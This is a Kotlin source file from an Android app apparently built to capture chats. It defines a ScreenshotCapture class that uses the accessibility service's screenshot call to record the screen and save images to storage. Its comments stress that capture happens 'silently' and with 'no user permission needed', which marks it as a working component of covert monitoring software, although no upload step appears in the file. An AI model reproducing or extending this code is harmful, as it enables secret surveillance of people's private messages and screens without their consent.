package com.chats.capture.utils

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.suspendCancellableCoroutine
import timber.log.Timber
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

/**
 * Utility for capturing screenshots silently
 * Uses AccessibilityService.takeScreenshot() for Android 11+ (no user permission needed)
 * Falls back to alternative methods for older versions
 */
class ScreenshotCapture(private val accessibilityService: AccessibilityService) {
    
    /**
     * Capture screenshot and save to file
     * Returns file path if successful, null otherwise
     * Requires Android 11+ (API 30+) for AccessibilityService.takeScreenshot()
     */
    suspend fun captureScreenshot(): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Android 11+ (API 30+) - Use AccessibilityService.takeScreenshot()
                captureUsingAccessibilityService()
            } else {
                // Android 10 and below - Screenshot capture not available via AccessibilityService
                // Would require MediaProjection API which needs user permission
                Timber.w("Screenshot capture via AccessibilityService requires Android 11+ (current: ${Build.VERSION.SDK_INT})")
                null
            }
        } catch (e: Exception) {
            Timber.e(e, "Error capturing screenshot")
            null
        }
    }
    
    /**
     * Capture screenshot using AccessibilityService.takeScreenshot() (Android 11+)
     * This method doesn't require MediaProjection permission
     */
    @android.annotation.SuppressLint("NewApi")
    private suspend fun captureUsingAccessibilityService(): String? = suspendCancellableCoroutine { continuation ->
        try {
            Handler(Looper.getMainLooper())
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                accessibilityService.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    java.util.concurrent.Executors.newSingleThreadExecutor(),
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hardwareBuffer = result.hardwareBuffer
                                if (hardwareBuffer == null) {
                                    continuation.resume(null)
                                    return@onSuccess
                                }
                                
                                val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                    Bitmap.wrapHardwareBuffer(hardwareBuffer, android.graphics.ColorSpace.get(android.graphics.ColorSpace.Named.SRGB))
                                } else {
                                    null
                                }
                                
                                hardwareBuffer.close()
                                
                                if (bitmap == null) {
                                    continuation.resume(null)
                                    return@onSuccess
                                }
                                
                                val filePath = saveBitmapToFile(bitmap)
                                if (filePath != null) {
                                    Timber.d("Screenshot captured: $filePath")
                                    continuation.resume(filePath)
                                } else {
                                    continuation.resume(null)
                                }
                            } catch (e: Exception) {
                                Timber.e(e, "Error processing screenshot")
                                continuation.resume(null)
                            }
                        }
                        
                        override fun onFailure(errorCode: Int) {
                            Timber.e("Screenshot capture failed with error code: $errorCode")
                            continuation.resume(null)
                        }
                    }
                )
            } else {
                continuation.resume(null)
            }
        } catch (e: Exception) {
            Timber.e(e, "Error initiating screenshot capture")
            continuation.resume(null)
        }
    }
    
    /**
     * Convert Image to Bitmap
     */
    @android.annotation.SuppressLint("NewApi")
    private fun imageToBitmap(image: android.media.Image): Bitmap {
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width
        
        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        
        // Crop to remove padding
        return Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
    }
    
    /**
     * Save bitmap to file
     */
    private fun saveBitmapToFile(bitmap: Bitmap): String? {
        return try {
            val dir = File(accessibilityService.getExternalFilesDir(null), "screenshots")
            if (!dir.exists()) {
                dir.mkdirs()
            }
            
            val fileName = "screenshot_${System.currentTimeMillis()}.png"
            val file = File(dir, fileName)
            
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
            }
            
            bitmap.recycle()
            file.absolutePath
        } catch (e: Exception) {
            Timber.e(e, "Error saving screenshot to file")
            null
        }
    }
}
